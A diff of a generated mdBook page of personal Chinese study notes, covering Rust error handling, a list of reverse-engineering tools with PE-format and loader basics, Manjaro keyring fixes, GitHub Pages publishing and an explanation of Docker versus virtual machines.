-let team_name = String::from(&quot;藍隊&quot;);
+let team_name = String::from("藍隊");
 let score = scores.get(&amp;team_name);
 </code></pre>
 <h3 id="錯誤處理"><a class="header" href="#錯誤處理">錯誤處理</a></h3>
@@ -3068,7 +3667,7 @@ let score = scores.get(&amp;team_name);
 <li>Result&lt;T, E&gt; 型別</li>
 </ul>
 </li>
-<li>不可復原的（unrecoverable） 
+<li>不可復原的（unrecoverable）
 <ul>
 <li>panic! 巨集  //將程式停止執行
 <ul>
@@ -3091,23 +3690,23 @@ let score = scores.get(&amp;team_name);
 </ul>
 </li>
 </ol>
-<pre><code>let f = File::open(&quot;hello.txt&quot;);
+<pre><code>let f = File::open("hello.txt");
 let f = match f {
    Ok(file) =&gt; file,
    Err(error) =&gt; match error.kind() {
-      ErrorKind::NotFound =&gt; match File::create(&quot;hello.txt&quot;) {
+      ErrorKind::NotFound =&gt; match File::create("hello.txt") {
           Ok(fc) =&gt; fc,
-          Err(e) =&gt; panic!(&quot;建立檔案時發生問題：{:?}&quot;, e),
+          Err(e) =&gt; panic!("建立檔案時發生問題：{:?}", e),
       },
       other_error =&gt; {
-          panic!(&quot;開啟檔案時發生問題：{:?}&quot;, other_error)
+          panic!("開啟檔案時發生問題：{:?}", other_error)
       }
    },
 };
 </code></pre>
 <pre><code> - 3. 錯誤發生時產生恐慌的捷徑：unwrap 與 expect  
-   - let f = File::open(&quot;hello.txt&quot;).unwrap();  
-   - let f = File::open(&quot;hello.txt&quot;).expect(&quot;開啟 hello.txt 失敗&quot;);  
+   - let f = File::open("hello.txt").unwrap();  
+   - let f = File::open("hello.txt").expect("開啟 hello.txt 失敗");  
  - 4. 傳播錯誤的捷徑：? 運算子  
    - f.read_to_string(&amp;mut s)?;  
       Ok(s)  
@@ -3131,11 +3730,11 @@ let f = match f {
 </ul>
 <pre><code>特徵界限語法
 pub fn notify(item: &amp;impl Summary) {
-    println!(&quot;頭條新聞！{}&quot;, item.summarize());
+    println!("頭條新聞！{}", item.summarize());
 }
 泛型型別的特徵界限
 pub fn notify&lt;T: Summary&gt;(item: &amp;T) {
-    println!(&quot;頭條新聞！{}&quot;, item.summarize());
+    println!("頭條新聞！{}", item.summarize());
 }
 
 特徵界限語法
@@ -3182,7 +3781,7 @@ export RUST_BACKTRACE=full</li>
 <a href="https://www.rust-lang.org/tools/install">Rust工具安裝</a></p>
 <ul>
 <li>
-<p>cn wiki 
+<p>cn wiki
 <a href="https://rustwiki.org">CN - Rust 官方文档中文教程</a><br />
 https://rust.ffactory.org<br />
 <a href="https://rustcc.gitbooks.io/rustprimer/content/">给初学者的Rust中文教程 The Rust primer for beginners</a></p>
@@ -3218,8 +3817,59 @@ https://docs.rs/libloading/latest/libloading/</p>
 </li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="reversing-engine-tool"><a class="header" href="#reversing-engine-tool">Reversing engine tool</a></h1>
+<h2 id="linux"><a class="header" href="#linux">Linux</a></h2>
+<p>radare2<br />
+Cutter<br />
+Ghidra<br />
+edb-debugger
+gdb, pwndbg,gef plugin</p>
+<h2 id="windows"><a class="header" href="#windows">windows</a></h2>
+<ul>
+<li>
+<p>32bit<br />
+ollydbg<br />
+x64dbg/windbg/sysinternals suite</p>
+</li>
+<li>
+<p>32bit/64bit<br />
+IDA Pro/Free<br />
+<a href="https://gitlab.com/marakew/syser">syser</a></p>
+</li>
+</ul>
+<h2 id="memory-leak-debugger"><a class="header" href="#memory-leak-debugger">memory leak debugger</a></h2>
+<p>Valgrind</p>
+<h2 id="沙箱"><a class="header" href="#沙箱">沙箱</a></h2>
+<p>CAPEv2</p>
+<h2 id="逆向工程工具"><a class="header" href="#逆向工程工具">逆向工程工具</a></h2>
+<p>SAT
+boolean satifiability problem
+harder-serial
+automate binary alaysis</p>
+<p>control flow graph</p>
+<ul>
+<li>
+<p>symbolic execution</p>
+</li>
+<li>
+<p>tools<br />
+<a href="https://github.com/angr/angr">angr</a>
+the art of war</p>
+</li>
+</ul>
+<p><a href="https://en.wikipedia.org/wiki/X86_instruction_listings">x86 instruction set</a><br />
+COFF, common object file format</p>
+<p>little end 小端序<br />
+https://zh.wikipedia.org/zh-tw/%E5%AD%97%E8%8A%82%E5%BA%8F
+application loader 執行程式裝載器
+optional header</p>
+<p>IDA<br />
+x64dbg<br />
+010 editor<br />
+binary ninja</p>
+<h3 id="vm"><a class="header" href="#vm">VM</a></h3>
+<p>Flare VM</p>
+<h2 id="pe-format"><a class="header" href="#pe-format">PE format</a></h2>
 <h2 id="基礎認知"><a class="header" href="#基礎認知">基礎認知</a></h2>
-<h3 id="pe"><a class="header" href="#pe">PE</a></h3>
 <ul>
 <li>process memory
 <ol>
@@ -3258,31 +3908,40 @@ https://docs.rs/libloading/latest/libloading/</p>
 </ol>
 </li>
 </ul>
-<h2 id="linux"><a class="header" href="#linux">Linux</a></h2>
-<p>radare2<br />
-Cutter<br />
-Ghidra<br />
-edb-debugger</p>
-<h2 id="windows"><a class="header" href="#windows">windows</a></h2>
-<ul>
-<li>
-<p>32bit<br />
-ollydbg</p>
+<ol>
+<li>程式碼內容-機械碼存入.text</li>
+<li>引入函數表-裝載器填充函數,讓程式碼能取得函數位置</li>
+<li>optional header-讓裝載器讀取的結構,修正動態模組</li>
+</ol>
+<p>.text 程式節，機械碼程式<br />
+.data 資料節，程式的全域變數和靜態變數，巨集定義<br />
+.rsrc 資源節，程式資源</p>
+<h2 id="靜態-動態"><a class="header" href="#靜態-動態">靜態-&gt;動態</a></h2>
+<ol>
+<li>Parent Process(User space) - Create process</li>
+<li>Child process crated and file mapped(kernel space)</li>
+<li>Loader(user space)
+<ol>
+<li>RtlUserThreadStart</li>
+<li>LdrInitalizeThunk</li>
+<li>LdrpInitializeProcess</li>
+</ol>
 </li>
-<li>
-<p>32bit/64bit<br />
-IDA Pro/Free<br />
-<a href="https://gitlab.com/marakew/syser">syser</a></p>
-</li>
-</ul>
-<h2 id="memory-leak-debugger"><a class="header" href="#memory-leak-debugger">memory leak debugger</a></h2>
-<p>Valgrind  </p>
+</ol>
+<h2 id="tools"><a class="header" href="#tools">tools</a></h2>
+<p>PEview<br />
+PE-bear</p>
+<p>https://zh.wikipedia.org/zh-tw/%E5%AD%97%E8%8A%82%E5%BA%8F</p>
+<p>https://zh.1lib.tw/book/897636/1f8959?dsource=recommend
+https://zh.1lib.tw/book/2918529/763ddc?dsource=recommend
+https://zh.1lib.tw/book/2612437/6033d0?dsource=recommend</p>
+<p>https://zh.1lib.tw/book/21552944/3add8c</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="psoftware-development-glossary-程式開發術語"><a class="header" href="#psoftware-development-glossary-程式開發術語">Psoftware development glossary 程式開發術語</a></h1>
 <h2 id="常用"><a class="header" href="#常用">常用</a></h2>
 <p>Framework<br />
 callback function 回呼/回調函式<br />
 handler 處理程式</p>
-<h3 id="參考網頁-9"><a class="header" href="#參考網頁-9">參考網頁</a></h3>
+<h3 id="參考網頁-12"><a class="header" href="#參考網頁-12">參考網頁</a></h3>
 <ul>
 <li>
 <p>callback<br />
@@ -3330,7 +3989,7 @@ https://github.com/MaikKlein/unreal-rust#-getting-started</p>
 每個引擎都有哪些獨特的功能？
 是否有可用的文件和社群支援？
 我真的需要一個全面的遊戲引擎或庫存嗎？</p>
-<h5 id="參考網頁-10"><a class="header" href="#參考網頁-10">參考網頁</a></h5>
+<h5 id="參考網頁-13"><a class="header" href="#參考網頁-13">參考網頁</a></h5>
 <p>https://blog.logrocket.com/5-rust-game-engines-consider-next-project/</p>
 <h3 id="12-進行方式步驟"><a class="header" href="#12-進行方式步驟">1.2 進行方式步驟</a></h3>
 <h2 id="2-中期著手進行"><a class="header" href="#2-中期著手進行">2. 中期，著手進行</a></h2>
@@ -3411,7 +4070,7 @@ sudo pacman-key --populate archlinux manjaro
 <ol start="3">
 <li>重新更新package，因為archlinux與manjaro有版本差異，混合在一起很難說有什麼問題，最好是重新downgrade差異的package版本</li>
 </ol>
-<h2 id="參考網頁-11"><a class="header" href="#參考網頁-11">參考網頁</a></h2>
+<h2 id="參考網頁-14"><a class="header" href="#參考網頁-14">參考網頁</a></h2>
 <p>https://forum.manjaro.org/t/howto-solve-keyring-related-issues-in-manjaro/96949<br />
 https://wiki.manjaro.org/index.php/Downgrading_packagess</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="工具-2"><a class="header" href="#工具-2">工具</a></h1>
@@ -3443,7 +4102,7 @@ https://wiki.manjaro.org/index.php/Downgrading_packagess</p>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="free-shell-accounts"><a class="header" href="#free-shell-accounts">Free Shell Accounts</a></h1>
 <p>收集/試用 網路上公開申請註冊的 Shell 主機</p>
-<h2 id="參考網頁-12"><a class="header" href="#參考網頁-12">參考網頁</a></h2>
+<h2 id="參考網頁-15"><a class="header" href="#參考網頁-15">參考網頁</a></h2>
 <p><a href="https://shells.red-pill.eu">Free sheel accounts</a><br />
 http://sdf.org</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="markdown軟體"><a class="header" href="#markdown軟體">Markdown軟體</a></h1>
@@ -3491,7 +4150,7 @@ http://sdf.org</p>
 <ol>
 <li>註冊 github 帳號</li>
 <li>在 github 建立新的 repository<br />
-建立名稱格式為：&quot;帳號名稱.github.io&quot;  #例如testbook.github.io</li>
+建立名稱格式為："帳號名稱.github.io"  #例如testbook.github.io</li>
 <li>選擇 Repo 可見性為 public 後，點選Create</li>
 <li>github page 會查找 index.html index.md README.md 文件當做入口網頁的首頁，SUMMARY.md 則是左側的選單列表</li>
 <li>在自己PC/NB中的git目錄下clone
@@ -3564,10 +4223,60 @@ rsync -aHruv testbook/book/ testbook.github.io/
 <ol>
 <li>檔名用英文，中文在mdbook的hyperlink與產生的html檔會有問題，最好也不要有特殊字元/空白/括號</li>
 </ol>
-<h2 id="參考網頁-13"><a class="header" href="#參考網頁-13">參考網頁</a></h2>
+<h2 id="參考網頁-16"><a class="header" href="#參考網頁-16">參考網頁</a></h2>
 <p><a href="https://docs.github.com/zh/pages/getting-started-with-github-pages/creating-a-github-pages-site">github - getting-started-with-github-pages</a><br />
 <a href="https://rust-lang.github.io/mdBook/">rust mdbook</a><br />
 <a href="https://medium.com/%E9%80%B2%E6%93%8A%E7%9A%84-git-git-git/%E5%BE%9E%E9%9B%B6%E9%96%8B%E5%A7%8B-%E7%94%A8github-pages-%E4%B8%8A%E5%82%B3%E9%9D%9C%E6%85%8B%E7%B6%B2%E7%AB%99-fa2ae83e6276">從零開始-用github-pages</a></p>
+<div style="break-before: page; page-break-before: always;"></div><p>本OS是kernel+package , 現在docker執行的package= lib+app=image</p>
+<p>image內容沒有kernel ,而是docker運行時讀取外層主系統的部份kernel功能
+不起眼的全端 從架構來看 docker本身是個應用，非VM，當然有人把它當vm使用但結構上來說他就是個應用 ，即使是container  中運行，也就是起了一個應用程式，那也就是沒核心，吃主機資源而已，我這麼說正確嗎？
+kernel是共享資源,經過docker請求進行分配
+VM則是模擬硬體層,所以才需要kernel+image(package)
+所以docker沒有開機過程,而是直接運行app,所以才可以這麼快啟動
+所以docker自己打包要自己寫entryporint做啟動配置</p>
+<p>是的,讀同一個kernel,只是分配不同的user space資源
+就好像同一棟大樓,但不同樓層,經同樣的電梯或樓梯溝通,這構通則是透過docker這個管理員</p>
+<p>所以docker才被稱為微服務,專注在應用服務層,把每個服務打包起來單一化,才不會在系統中過度相依而難以變動
+也不會像VM要的那麼多資源才能運作</p>
+<p>alpine只是linux的一種套件包組合
+所有linux,不管是redhat ubuntu archlinux alpine都只是不同人維護的各版本套件包,加上搭配不同版本的linux knerel
+所以app基本上都可以跑在同一個kernel版本
+嚴格上應該要說GNU+linux kernel, GNU就是各種package組成的,每個社群/公司團隊各自打包就各自命名自己的統稱名字,kernel是只有一個維護團隊,那就是linus大神領導的
+ubuntu也有mysql套件可用,alpine也有有mysql套件可用,但image內環境各團隊調整的不太一樣,就看習慣用哪套
+alpine打包的image很精小,所以省空間</p>
+<p>app己經由docker隔離,所以存取不到host os上ubuntu的檔案
+當你的docker app需要環境才能跑
+假設你啟動的alpine nginx需要某個lib的1.1版,但alpine mysql需要這個lib的1.0版,但這lib無法同時存在1.0 1.1
+這時就能跑二個,一個跑alpine+lib1.0+nginx ,一個跑alpine+lib1.1+mysql或是跑個ubuntu+lib1.0+mysql</p>
+<p>我來舉個image實例可能會比較清楚
+當你要打包一個docker nginx服務時,需要以下</p>
+<ol>
+<li>base OS , /dev /var /etc /lib /bin /sbin.... 基本系統運作需求</li>
+<li>nginx 官方package</li>
+<li>nginx 相依的其他 lib</li>
+<li>nginx 設定</li>
+<li>啟動nginx所需的環境初始化script
+當你選則alpine當base OS, 時,只會有最低OS運作的檔案, 你要自行補上2,3,4,5 , 2,3,4,5就是可以替換成任何你要的服務
+但不是每個服務都能好好相容alpine , 有時package可能比較適應 ubuntu , 選ubuntu當base OS就不用改與不用補太多3. lib東西進去
+alpine我記得最小好像只有幾M到10多M, ubuntu要100多M ,  如果你只是想放你自己寫的小程式, 又不需要相依太多環境lib , 那就會選最小的alpine就足夠
+所以dockr的概念就像積木,你可以選任一基底image,用別人或自己包好的image
+從app來看, alpine的nginx ,跟ubuntu nginx在服務上是沒有差異的(同一個版本nginx),</li>
+</ol>
+<p>整image並不會載入到記錄體, 主要是你app用到多少算多少, 如以下我自己nextcloud例子
+image
+REPOSITORY  TAG   IMAGE ID            CREATED             SIZE
+nextcloud      22.1.1 zzzzzzzzzz            9 months ago        969MB</p>
+<p>docker stats
+CONTAINER ID      NAME          CPU %   MEM USAGE / LIMIT    MEM %  NET I/O             BLOCK I/O           PIDS
+xxxxxxxxxxxx        nextcloud       0.00%    102.8MiB / 5.85GiB   1.72%   549MB / 54.3MB    245MB / 197kB       11
+"整個image並不會載入到記憶體" , 最近老是打錯字
+大小主要是內容包了多少需要的東西
+就像寫了一支獨立小程式,本身只用了10M記憶體,
+跟nextcloud可能會要用到nginx + php-fpm服務才能服務運作,光nginx加上相依的lib , 還有php-fpm相依的lib 啟動這二個服務可能就要用到幾十M或上百M
+反之,你要把這些包進alpine裡,大小也會變大,這體積與記憶體用量是無法消除的, 當然還是能用一定程度優化能改善
+優化就要靠自己或各image團隊的手法了
+啟動速度我倒是沒比較過
+但import/export或是build的速度會影響到營運方式,像有架構的是服務需求進來才生成docker啟動/還原之類的,那就有所影響</p>
 
                     </main>
 
